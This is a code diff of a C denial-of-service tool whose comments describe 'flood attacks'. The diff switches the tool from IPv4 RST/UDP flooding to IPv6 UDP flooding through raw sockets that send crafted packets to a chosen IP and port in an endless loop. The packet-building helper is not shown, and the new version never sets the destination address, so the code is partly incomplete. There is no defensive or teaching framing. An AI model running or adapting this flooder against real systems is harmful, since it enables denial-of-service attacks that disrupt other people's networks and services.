@@ -5,9 +5,8 @@
 #include <unistd.h>
 
 #include "packets_settings.h"
-#define DEFAULT_IP "127.0.0.1"
+#define DEFAULT_IP "::1"
 #define DEFAULT_PORT 443
-#define DEFAULT_FLOOD IPPROTO_TCP
 
 // typedef struct Target {
 //     char* _ip;
@@ -25,19 +24,10 @@ void get_cli(int argc, char* argv[], struct packet* pkt) {
             printf("There is no input.\nDefault values will be entered\n\n");
             strcpy(pkt->target_ip_address, DEFAULT_IP);
             pkt->target_port = 443;
-            pkt->protocol = IPPROTO_TCP;
+            pkt->protocol = IPPROTO_UDP;
             break;
         case 5:
             if ((strcmp(argv[1], "-t") == 0) && (strcmp(argv[3], "-p") == 0)) {
-                strcpy(pkt->target_ip_address, argv[2]);
-                pkt->target_port = atoi((char*)argv[4]);
-                pkt->protocol = IPPROTO_TCP;
-                break;
-            } else
-                printf("Error, too many values or incorrect entry\n");
-
-        case 6:
-            if ((strcmp(argv[1], "-t") == 0) && (strcmp(argv[3], "-p") == 0) && (strcmp(argv[5], "-r") == 0)) {
                 strcpy(pkt->target_ip_address, argv[2]);
                 pkt->target_port = atoi((char*)argv[4]);
                 pkt->protocol = IPPROTO_UDP;
@@ -49,12 +39,12 @@ void get_cli(int argc, char* argv[], struct packet* pkt) {
             }
     }
 }
-
+void run(struct packet* pkt) {
+}
 /*
 The following main function can have the following parameters (flags)
--t	The target IP address for the flood attacks, default is 127.0.0.1
+-t	The target IP address for the flood attacks, default is ::1
 -p	The target port, default is 443
--r	Switch from the default sending of RST flood to the UDP flood attack
 */
 
 int main(int argc, char* argv[]) {
@@ -71,32 +61,24 @@ int main(int argc, char* argv[]) {
 
     int enable = 1;
     // MUST use sudo, otherwise we'll encounter an error here
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sock == -1) {
-        printf("Error opening a socket!\n");
-        exit(1);
-    }
-    int sockopt = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
-    if (sockopt == -1) {
-        printf("Error setting socket options!\n");
-        exit(1);
-    }
-    struct sockaddr_in dest_info;
-    dest_info.sin_family = AF_INET;
-    dest_info.sin_addr.s_addr = inet_addr(pkt.target_ip_address);
+    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
+    int sockopt = setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &enable, sizeof(enable));
+    if (sockopt == -1 || sock == -1) exit(1);
 
-    char packet[40];
+    struct sockaddr_in6 dst;
+    dst.sin6_family = AF_INET6;
+    dst.sin6_port = htons(pkt.source_port);
 
-    char attack_type[15];
-    strcpy(attack_type, (pkt.protocol == IPPROTO_TCP) ? "RST" : "UDP");
+    char packet[48];
 
-    printf("Attack Type: %s\nTarget: %s:%d\n", attack_type, pkt.target_ip_address, pkt.target_port);
+    printf("Attack Type: UDP FLOOD\nTarget: %s:%d\n", pkt.target_ip_address, pkt.target_port);
     // infinite loop, up to user exit
     while (1) {
-        memset(packet, 0, 40);
+        memset(packet, 0, 48);
         create_packet(packet, &pkt);
-        struct iphdr* iph = (struct iphdr*)packet;
-        sendto(sock, iph, iph->tot_len, 0, (struct sockaddr*)&dest_info, sizeof(dest_info));
+        // printf("%s\n", pkt.source_ip_address);
+
+        sendto(sock, packet, (IPHDR_SZ + sizeof(struct udphdr)), 0, (struct sockaddr*)&dst, sizeof(dst));
     }
 
     close(sock);
